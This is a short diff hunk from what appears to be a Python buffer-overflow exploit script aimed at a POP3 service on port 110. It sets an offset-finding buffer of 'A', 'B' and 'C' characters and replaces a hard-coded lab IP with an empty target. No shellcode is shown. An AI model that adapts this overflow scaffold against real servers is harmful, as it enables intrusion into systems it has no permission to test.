@@ -13,7 +13,7 @@ Buffer="A"*2606+"B"*4+"C"*(3500-2606-4)
 #Tport=raw_input("Enter Target Port: ")
 	
 UN='username'
-target='10.11.20.153'
+target=''
 Tport=110
 
 try:	
